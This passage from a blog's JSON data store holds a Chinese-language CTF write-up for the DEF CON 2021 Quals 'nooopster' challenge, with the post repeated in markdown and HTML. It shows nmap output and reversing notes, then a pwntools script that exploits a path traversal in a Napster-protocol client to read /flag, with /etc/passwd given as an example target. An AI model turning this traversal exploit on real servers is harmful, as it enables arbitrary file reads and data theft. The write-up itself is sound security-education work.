互動的所有指令。\n\n![](62rKHoR.png)\n\n以下我執行了這些指令。\n\n```bash\n# 列出所有頻道\n/clist\n\n# 進入 chat 頻道\n/join #chat\n\n# 列出 nooopster 這個用戶提供的檔案清單\n/browse nooopster\n```\n\n清單中有一個非 mp3 的檔案，載下來之後發現這是一隻 elf 格式的程式。我們開始嘗試逆它。\n\n![](Jbt611q.png)\n\n## 逆向\n\n分析整體流程可以大約分為以下幾個階段: \n\n1. 連線到 127.0.0.1:8888 ， 並且檢查 napser server 上有沒有 **nooopster** 這個用戶，若沒有的話，以 **nooopster** 為用戶名登入。\n2. 創建一條 thread 並且在裡面創建 data server (負責用來上傳檔案到 nooopster server 或是讓其他用戶直接下載檔案) 在 0.0.0.0:7070 監聽。\n   1. 收到用戶連線後，創建一條 thread 負責處理此用戶的請求，先檢查用戶是否在下載請求的清單中，如果在的話，接者檢查要求的檔案名稱是否以字串 **\"\\shared\\\\\"** 作為開頭，若通過檢查，接者會把字串 **\"\\shared\\\\\"** 以後檔案名稱作為字串傳入 `open` 中。例如用戶要求下載 **\"\\shared\\\\/etc/passwd\"**，則最後得到的結果會是 `open(\"/etc/passwd\",\"r\")`。 這裡很明顯有**路徑穿越的漏洞**，可以利用這個漏洞去讀 **\"/flag\"**。\n3. main thread 接者會不斷的重複傳送幾條提示用的訊息到 napster server 中的頻道 chat 中，以及接收來自 napster server 的檔案下載請求 ( 其他用戶的下載請求 )，這裡不做任何檢查，**直接把用戶名加入下載請求的清單中**。\n\n\n\n分析完後可以很明顯的發現，這是一隻根據 napster 的 protocol 實作出來的簡易 client，且帶有**路徑穿越的漏洞**，讓我們能夠下載任意檔案。\n\n## 利用腳本\n\n詳細的 protocol 細節在逆向 nooopster 這支 binary 的時候，有搜尋到對應的 [specification](http://opennap.sourceforge.net/napster.txt)，照著上面內容實作跟 server 互動的封包即可。\n\n```python\nfrom pwn import *\nimport ipaddress\n\nuser = \"test\"\ndef to_nap_format(opcode, content):\n    return p16(len(content)) + p16(opcode) + content\n\ndef nap_msg_send(s, opcode, content):\n    s.send(to_nap_format(opcode, content))\n\ndef nap_msg_recv(s):\n    tmp = s.recvn(4, timeout = 0.5)\n    if not tmp:\n        return None  \n    n = u16(tmp[:2])\n    opcode = u16(tmp[2:])\n    \n    return {\"op\": opcode, \"data\":s.recvn(n)}\n\nnap_server = remote(\"192.168.5.1\", 8888)\n\n# 檢查 napster server 上是否有這個用戶名\nnap_msg_send(nap_server, 7, user.encode())\nmsg = nap_msg_recv(nap_server)\nprint(msg)\n\n# 登入伺服器\nnap_msg_send(nap_server, 2, f\"{user} test 0 \\\"nap v0.8\\\" 3\".encode())\nmsg = nap_msg_recv(nap_server)\nprint(msg)\n\n# 接收一些伺服器資訊\nwhile 1:\n    msg = nap_msg_recv(nap_server)\n    if not msg:\n        break\n\n# 請 napster server 向 nooopster 請求我們下載檔案的請求\nnap_msg_send(nap_server, 203, b\"nooopster \\\"\\\\shared\\\\nooopster\\\"\") \nmsg = nap_msg_recv(nap_server)\nprint(msg)\ntmp = msg[\"data\"].split(b' ')\n\n# nooopster 接受下載後 napster server 會回覆我們 nooopster's 的 data server 的地址和端口\nip = str(ipaddress.IPv4Address(u32(p32(int(tmp[1])), endian = \"big\")))\nport = int(tmp[2])\n\n# 直接觸發路徑穿越漏洞去讀取 flag\ndata_server = remote(ip, port)\nprint(data_server.recv())\ntarget_file = \"/flag\"\ndata_server.send(f\"GET{user} \\\"\\\\shared\\\\{target_file}\\\" 0\".encode())\n\nprint(data_server.recvall().decode())\nnap_server.close()\ndata_server.close()\n```\n\n\n\n# resource \n\n[Linux Napster Client: User Guide](http://nap.sourceforge.net/userguide.html#4.2.)\n\n[napster protocol](http://opennap.sourceforge.net/napster.txt)\n","slug":"defcon-ctf-2021-quals-nooopster","published":1,"updated":"2022-01-22T23:08:19.480Z","_id":"ckyqf585k00008agk0fsn123b","comments":1,"layout":"post","photos":[],"link":"","content":"<h1 id=\"nooopster\"><a href=\"#nooopster\" class=\"headerlink\" title=\"nooopster\"></a>nooopster</h1><p><img src=\"/2022/01/23/defcon-ctf-2021-quals-nooopster/BT4KL7X.png\"></p>\n<p><img src=\"/2022/01/23/defcon-ctf-2021-quals-nooopster/Z1zFFtl.png\"></p>\n<p><img src=\"/2022/01/23/defcon-ctf-2021-quals-nooopster/8tJ74WV.png\"></p>\n<h2 id=\"偵蒐階段\"><a href=\"#偵蒐階段\" class=\"headerlink\" title=\"偵蒐階段\"></a>偵蒐階段</h2><p>進入內網後對 <strong>192.168.5.1</strong> 進行掃描。得到以下結果</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Starting Nmap 7.80 ( https://nmap.org ) at 2022-01-23 06:08 CST</span><br><span class=\"line\">Nmap scan report for 192.168.5.1</span><br><span class=\"line\">Host is up (0.011s latency).</span><br><span class=\"line\"></span><br><span class=\"line\">PORT     STATE SERVICE         VERSION</span><br><span class=\"line\">7070/tcp open  napster         MLDonkey multi-network P2P client</span><br><span class=\"line\">8888/tcp open  sun-answerbook?</span><br><span class=\"line\"></span><br><span class=\"line\">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class=\"line\">Nmap done: 1 IP address (1 host up) scanned in 60.47 seconds</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>跟這兩個 port 進行互動沒得到什麼資訊，拿 <strong>napster</strong> 這個字眼跟題目很像的名字進行搜尋，發現這個 <a href=\"http://nap.sourceforge.net/\">client</a> ，載下來後跟 port 7070 互動，但發現沒有效果，嘗試用一樣的程式跟 port 8888 互動得到了響應。<a href=\"http://nap.sourceforge.net/userguide.html\">Linux Napster Client: User Guide</a> 這裡提供跟 napster server 互動的所有指令。</p>\n<p><img src=\"/2022/01/23/defcon-ctf-2021-quals-nooopster/62rKHoR.png\"></p>\n<p>以下我執行了這些指令。</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 列出所有頻道</span></span><br><span class=\"line\">/clist</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 進入 chat 頻道</span></span><br><span class=\"line\">/join <span class=\"comment\">#chat</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 列出 nooopster 這個用戶提供的檔案清單</span></span><br><span class=\"line\">/browse nooopster</span><br></pre></td></tr></table></figure>\n\n<p>清單中有一個非 mp3 的檔案，載下來之後發現這是一隻 elf 格式的程式。我們開始嘗試逆它。</p>\n<p><img src=\"/2022/01/23/defcon-ctf-2021-quals-nooopster/Jbt611q.png\"></p>\n<h2 id=\"逆向\"><a href=\"#逆向\" class=\"headerlink\" title=\"逆向\"></a>逆向</h2><p>分析整體流程可以大約分為以下幾個階段: </p>\n<ol>\n<li>連線到 127.0.0.1:8888 ， 並且檢查 napser server 上有沒有 <strong>nooopster</strong> 這個用戶，若沒有的話，以 <strong>nooopster</strong> 為用戶名登入。</li>\n<li>創建一條 thread 並且在裡面創建 data server (負責用來上傳檔案到 nooopster server 或是讓其他用戶直接下載檔案) 在 0.0.0.0:7070 監聽。<ol>\n<li>收到用戶連線後，創建一條 thread 負責處理此用戶的請求，先檢查用戶是否在下載請求的清單中，如果在的話，接者檢查要求的檔案名稱是否以字串 <strong>“\\shared\\“</strong> 作為開頭，若通過檢查，接者會把字串 <strong>“\\shared\\“</strong> 以後檔案名稱作為字串傳入 <code>open</code> 中。例如用戶要求下載 <strong>“\\shared\\/etc/passwd”<strong>，則最後得到的結果會是 <code>open(&quot;/etc/passwd&quot;,&quot;r&quot;)</code>。 這裡很明顯有</strong>路徑穿越的漏洞</strong>，可以利用這個漏洞去讀 **”/flag”**。</li>\n</ol>\n</li>\n<li>main thread 接者會不斷的重複傳送幾條提示用的訊息到 napster server 中的頻道 chat 中，以及接收來自 napster server 的檔案下載請求 ( 其他用戶的下載請求 )，這裡不做任何檢查，<strong>直接把用戶名加入下載請求的清單中</strong>。</li>\n</ol>\n<p>分析完後可以很明顯的發現，這是一隻根據 napster 的 protocol 實作出來的簡易 client，且帶有<strong>路徑穿越的漏洞</strong>，讓我們能夠下載任意檔案。</p>\n<h2 id=\"利用腳本\"><a href=\"#利用腳本\" class=\"headerlink\" title=\"利用腳本\"></a>利用腳本</h2><p>詳細的 protocol 細節在逆向 nooopster 這支 binary 的時候，有搜尋到對應的 <a href=\"http://opennap.sourceforge.net/napster.txt\">specification</a>，照著上面內容實作跟 server 互動的封包即可。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"keyword\">import</span> ipaddress</span><br><span class=\"line\"></span><br><span class=\"line\">user = <span class=\"string\">&quot;test&quot;</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">to_nap_format</span>(<span class=\"params\">opcode, content</span>):</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> p16(<span class=\"built_in\">len</span>(content)) + p16(opcode) + content</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">nap_msg_send</span>(<span class=\"params\">s, opcode, content</span>):</span></span><br><span class=\"line\">    s.send(to_nap_format(opcode, content))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">nap_msg_recv</span>(<span class=\"params\">s</span>):</span></span><br><span class=\"line\">    tmp = s.recvn(<span class=\"number\">4</span>, timeout = <span class=\"number\">0.5</span>)</span><br><span class=\"line\">    <span class=\"keyword\">if</span> <span class=\"keyword\">not</span> tmp:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">None</span>  </span><br><span class=\"line\">    n = u16(tmp[:<span class=\"number\">2</span>])</span><br><span class=\"line\">    opcode = u16(tmp[<span class=\"number\">2</span>:])</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"keyword\">return</span> &#123;<span class=\"string\">&quot;op&quot;</span>: opcode, <span class=\"string\">&quot;data&quot;</span>:s.recvn(n)&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">nap_server = remote(<span class=\"string\">&quot;192.168.5.1&quot;</span>, <span class=\"number\">8888</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 檢查 napster server 上是否有這個用戶名</span></span><br><span class=\"line\">nap_msg_send(nap_server, <span class=\"number\">7</span>, user.encode())</span><br><span class=\"line\">msg = nap_msg_recv(nap_server)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(msg)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 登入伺服器</span></span><br><span class=\"line\">nap_msg_send(nap_server, <span class=\"number\">2</span>, <span class=\"string\">f&quot;<span class=\"subst\">&#123;user&#125;</span> test 0 \\&quot;nap v0.8\\&quot; 3&quot;</span>.encode())</span><br><span class=\"line\">msg = nap_msg_recv(nap_server)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(msg)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 接收一些伺服器資訊</span></span><br><span class=\"line\"><span class=\"keyword\">while</span> <span class=\"number\">1</span>:</span><br><span class=\"line\">    msg = nap_msg_recv(nap_server)</span><br><span class=\"line\">    <span class=\"keyword\">if</span> <span class=\"keyword\">not</span> msg:</span><br><span class=\"line\">        <span class=\"keyword\">break</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 請 napster server 向 nooopster 請求我們下載檔案的請求</span></span><br><span class=\"line\">nap_msg_send(nap_server, <span class=\"number\">203</span>, <span class=\"string\">b&quot;nooopster \\&quot;\\\\shared\\\\nooopster\\&quot;&quot;</span>) </span><br><span class=\"line\">msg = nap_msg_recv(nap_server)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(msg)</span><br><span class=\"line\">tmp = msg[<span class=\"string\">&quot;data&quot;</span>].split(<span class=\"string\">b&#x27; &#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># nooopster 接受下載後 napster server 會回覆我們 nooopster&#x27;s 的 data server 的地址和端口</span></span><br><span class=\"line\">ip = <span class=\"built_in\">str</span>(ipaddress.IPv4Address(u32(p32(<span class=\"built_in\">int</span>(tmp[<span class=\"number\">1</span>])), endian = <span class=\"string\">&quot;big&quot;</span>)))</span><br><span class=\"line\">port = <span class=\"built_in\">int</span>(tmp[<span class=\"number\">2</span>])</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 直接觸發路徑穿越漏洞去讀取 flag</span></span><br><span class=\"line\">data_server = remote(ip, port)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(data_server.recv())</span><br><span class=\"line\">target_file = <span class=\"string\">&quot;/flag&quot;</span></span><br><span class=\"line\">data_server.send(<span class=\"string\">f&quot;GET<span class=\"subst\">&#123;user&#125;</span> \\&quot;\\\\shared\\\\<span class=\"subst\">&#123;target_file&#125;</span>\\&quot; 0&quot;</span>.encode())</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">print</span>(data_server.recvall().decode())</span><br><span class=\"line\">nap_server.close()</span><br><span class=\"line\">data_server.close()</span><br></pre></td></tr></table></figure>\n\n\n\n<h1 id=\"resource\"><a href=\"#resource\" class=\"headerlink\" title=\"resource\"></a>resource</h1><p><a href=\"http://nap.sourceforge.net/userguide.html#4.2.\">Linux Napster Client: User Guide</a></p>\n<p><a href=\"http://opennap.sourceforge.net/napster.txt\">napster protocol</a></p>\n","site":{"data":{}},"excerpt":"","more":"<h1 id=\"nooopster\"><a href=\"#nooopster\" class=\"headerlink\" title=\"nooopster\"></a>nooopster</h1><p><img src=\"/2022/01/23/defcon-ctf-2021-quals-nooopster/BT4KL7X.png\"></p>\n<p><img src=\"/2022/01/23/defcon-ctf-2021-quals-nooopster/Z1zFFtl.png\"></p>\n<p><img src=\"/2022/01/23/defcon-ctf-2021-quals-nooopster/8tJ74WV.png\"></p>\n<h2 id=\"偵蒐階段\"><a href=\"#偵蒐階段\" class=\"headerlink\" title=\"偵蒐階段\"></a>偵蒐階段</h2><p>進入內網後對 <strong>192.168.5.1</strong> 進行掃描。得到以下結果</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Starting Nmap 7.80 ( https://nmap.org ) at 2022-01-23 06:08 CST</span><br><span class=\"line\">Nmap scan report for 192.168.5.1</span><br><span class=\"line\">Host is up (0.011s latency).</span><br><span class=\"line\"></span><br><span class=\"line\">PORT     STATE SERVICE         VERSION</span><br><span class=\"line\">7070/tcp open  napster         MLDonkey multi-network P2P client</span><br><span class=\"line\">8888/tcp open  sun-answerbook?</span><br><span class=\"line\"></span><br><span class=\"line\">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class=\"line\">Nmap done: 1 IP address (1 host up) scanned in 60.47 seconds</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>跟這兩個 port 進行互動沒得到什麼資訊，拿 <strong>napster</strong> 這個字眼跟題目很像的名字進行搜尋，發現這個 <a href=\"http://nap.sourceforge.net/\">client</a> ，載下來後跟 port 7070 互動，但發現沒有效果，嘗試用一樣的程式跟 port 8888 互動得到了響應。<a href=\"http://nap.sourceforge.net/userguide.html\">Linux Napster Client: User Guide</a> 這裡提供跟 napster server 互動的所有指令。</p>\n<p><img src=\"/2022/01/23/defcon-ctf-2021-quals-nooopster/62rKHoR.png\"></p>\n<p>以下我執行了這些指令。</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 列出所有頻道</span></span><br><span class=\"line\">/clist</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 進入 chat 頻道</span></span><br><span class=\"line\">/join <span class=\"comment\">#chat</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 列出 nooopster 這個用戶提供的檔案清單</span></span><br><span class=\"line\">/browse nooopster</span><br></pre></td></tr></table></figure>\n\n<p>清單中有一個非 mp3 的檔案，載下來之後發現這是一隻 elf 格式的程式。我們開始嘗試逆它。</p>\n<p><img src=\"/2022/01/23/defcon-ctf-2021-quals-nooopster/Jbt611q.png\"></p>\n<h2 id=\"逆向\"><a href=\"#逆向\" class=\"headerlink\" title=\"逆向\"></a>逆向</h2><p>分析整體流程可以大約分為以下幾個階段: </p>\n<ol>\n<li>連線到 127.0.0.1:8888 ， 並且檢查 napser server 上有沒有 <strong>nooopster</strong> 這個用戶，若沒有的話，以 <strong>nooopster</strong> 為用戶名登入。</li>\n<li>創建一條 thread 並且在裡面創建 data server (負責用來上傳檔案到 nooopster server 或是讓其他用戶直接下載檔案) 在 0.0.0.0:7070 監聽。<ol>\n<li>收到用戶連線後，創建一條 thread 負責處理此用戶的請求，先檢查用戶是否在下載請求的清單中，如果在的話，接者檢查要求的檔案名稱是否以字串 <strong>“\\shared\\“</strong> 作為開頭，若通過檢查，接者會把字串 <strong>“\\shared\\“</strong> 以後檔案名稱作為字串傳入 <code>open</code> 中。例如用戶要求下載 <strong>“\\shared\\/etc/passwd”<strong>，則最後得到的結果會是 <code>open(&quot;/etc/passwd&quot;,&quot;r&quot;)</code>。 這裡很明顯有</strong>路徑穿越的漏洞</strong>，可以利用這個漏洞去讀 **”/flag”**。</li>\n</ol>\n</li>\n<li>main thread 接者會不斷的重複傳送幾條提示用的訊息到 napster server 中的頻道 chat 中，以及接收來自 napster server 的檔案下載請求 ( 其他用戶的下載請求 )，這裡不做任何檢查，<strong>直接把用戶名加入下載請求的清單中</strong>。</li>\n</ol>\n<p>分析完後可以很明顯的發現，這是一隻根據 napster 的 protocol 實作出來的簡易 client，且帶有<strong>路徑穿越的漏洞</strong>，讓我們能夠下載任意檔案。</p>\n<h2 id=\"利用腳本\"><a href=\"#利用腳本\" class=\"headerlink\" title=\"利用腳本\"></a>利用腳本</h2><p>詳細的 protocol 細節在逆向 nooopster 這支 binary 的時候，有搜尋到對應的 <a href=\"http://opennap.sourceforge.net/napster.txt\">specification</a>，照著上面內容實作跟 server 互動的封包即可。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"keyword\">import</span> ipaddress</span><br><span class=\"line\"></span><br><span class=\"line\">user = <span class=\"string\">&quot;test&quot;</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">to_nap_format</span>(<span class=\"params\">opcode, content</span>):</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> p16(<span class=\"built_in\">len</span>(content)) + p16(opcode) + content</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">nap_msg_send</span>(<span class=\"params\">s, opcode, content</span>):</span></span><br><span class=\"line\">    s.send(to_nap_format(opcode, content))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">nap_msg_recv</span>(<span class=\"params\">s</span>):</span></span><br><span class=\"line\">    tmp = s.recvn(<span class=\"number\">4</span>, timeout = <span class=\"number\">0.5</span>)</span><br><span class=\"line\">    <span class=\"keyword\">if</span> <span class=\"keyword\">not</span> tmp:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">None</span>  </span><br><span class=\"line\">    n = u16(tmp[:<span class=\"number\">2</span>])</span><br><span class=\"line\">    opcode = u16(tmp[<span class=\"number\">2</span>:])</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"keyword\">return</span> &#123;<span class=\"string\">&quot;op&quot;</span>: opcode, <span class=\"string\">&quot;data&quot;</span>:s.recvn(n)&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">nap_server = remote(<span class=\"string\">&quot;192.168.5.1&quot;</span>, <span class=\"number\">8888</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 檢查 napster server 上是否有這個用戶名</span></span><br><span class=\"line\">nap_msg_send(nap_server, <span class=\"number\">7</span>, user.encode())</span><br><span class=\"line\">msg = nap_msg_recv(nap_server)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(msg)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 登入伺服器</span></span><br><span class=\"line\">nap_msg_send(nap_server, <span class=\"number\">2</span>, <span class=\"string\">f&quot;<span class=\"subst\">&#123;user&#125;</span> test 0 \\&quot;nap v0.8\\&quot; 3&quot;</span>.encode())</span><br><span class=\"line\">msg = nap_msg_recv(nap_server)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(msg)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 接收一些伺服器資訊</span></span><br><span class=\"line\"><span class=\"keyword\">while</span> <span class=\"number\">1</span>:</span><br><span class=\"line\">    msg = nap_msg_recv(nap_server)</span><br><span class=\"line\">    <span class=\"keyword\">if</span> <span class=\"keyword\">not</span> msg:</span><br><span class=\"line\">        <span class=\"keyword\">break</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 請 napster server 向 nooopster 請求我們下載檔案的請求</span></span><br><span class=\"line\">nap_msg_send(nap_server, <span class=\"number\">203</span>, <span class=\"string\">b&quot;nooopster \\&quot;\\\\shared\\\\nooopster\\&quot;&quot;</span>) </span><br><span class=\"line\">msg = nap_msg_recv(nap_server)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(msg)</span><br><span class=\"line\">tmp = msg[<span class=\"string\">&quot;data&quot;</span>].split(<span class=\"string\">b&#x27; &#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># nooopster 接受下載後 napster server 會回覆我們 nooopster&#x27;s 的 data server 的地址和端口</span></span><br><span class=\"line\">ip = <span class=\"built_in\">str</span>(ipaddress.IPv4Address(u32(p32(<span class=\"built_in\">int</span>(tmp[<span class=\"number\">1</span>])), endian = <span class=\"string\">&quot;big&quot;</span>)))</span><br><span class=\"line\">port = <span class=\"built_in\">int</span>(tmp[<span class=\"number\">2</span>])</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 直接觸發路徑穿越漏洞去讀取 flag</span></span><br><span class=\"line\">data_server = remote(ip, port)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(data_server.recv())</span><br><span class=\"line\">target_file = <span class=\"string\">&quot;/flag&quot;</span></span><br><span class=\"line\">data_server.send(<span class=\"string\">f&quot;GET<span class=\"subst\">&#123;user&#125;</span> \\&quot;\\\\shared\\\\<span class=\"subst\">&#123;target_file&#125;</span>\\&quot; 0&quot;</span>.encode())</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">print</span>(data_server.recvall().decode())</span><br><span class=\"line\">nap_server.close()</span><br><span class=\"line\">data_server.close()</span><br></pre></td></tr></table></figure>\n\n\n\n<h1 id=\"resource\"><a href=\"#resource\" class=\"headerlink\" title=\"resource\"></a>resource</h1><p><a href=\"http://nap.sourceforge.net/userguide.html#4.2.\">Linux Napster Client: User Guide</a></p>\n<p><a href=\"http://opennap.sourceforge.net/napster.txt\">napster protocol</a></p>\n"}],"PostAsset":[{"_id":"source/_posts/初探IOT安全CVE-2020-8423-PART1/1.png","slug":"1.png","post":"ckyopyh2100019kgk1rfo2613","modified":0,"renderable":0},{"_id":"source/_posts/初探IOT安全CVE-2020-8423-PART1/2.png","slug":"2.png","post":"ckyopyh2100019kgk1rfo2613","modified":0,"renderable":0},{"_id":"source/_posts/初探IOT安全CVE-2020-8423-PART1/4.png","slug":"4.png","post":"ckyopyh2100019kgk1rfo2613","modified":0,"renderable":0},{"_id":"source/_posts/初探IOT安全CVE-2020-8423-PART1/5.png","slug":"5.png","post":"ckyopyh2100019kgk1rfo2613","modified":0,"renderable":0},{"_id":"source/_posts/初探IOT安全CVE-2020-8423-PART1/6.png","slug":"6.png","post":"ckyopyh2100019kgk1rfo2613","modified":0,"renderable":0},{"_id":"source/_posts/初探IOT安全CVE-2020-8423-PART1/7.png","slug":"7.png","post":"ckyopyh2100019kgk1rfo2613","modified":0,"renderable":0},{"_id":"source/_posts/初探IOT安全CVE-2020-8423-PART1/8.png","slug":"8.png","post":"ckyopyh2100019kgk1rfo2613","modified":0,"renderable":0},{"_id":"source/_posts/起點/1.png","slug":"1.png","post":"ckyopyh2600039kgk67ihap6e","modified":0,"renderable":0},{"_id":"source/_posts/defcon-ctf-2021-quals-mra/1v2Ebom.png","slug":"1v2Ebom.png","post":"ckyotnyi100003ngk9k5vcpkb","modified":0,"renderable":0},{"_id":"source/_posts/defcon-ctf-2021-quals-mra/3QdQD5F.png","slug":"3QdQD5F.png","post":"ckyotnyi100003ngk9k5vcpkb","modified":0,"renderable":0},{"_id":"source/_posts/defcon-ctf-2021-quals-mra/3gGqHMC.png","slug":"3gGqHMC.png","post":"ckyotnyi100003ngk9k5vcpkb","modified":0,"renderable":0},{"_id":"source/_posts/defcon-ctf-2021-quals-mra/49iqumD.png","slug":"49iqumD.png","post":"ckyotnyi100003ngk9k5vcpkb","modified":0,"renderable":0},{"_id":"source/_posts/defcon-ctf-2021-quals-mra/FuvJDpX.png","slug":"FuvJDpX.png","post":"ckyotnyi1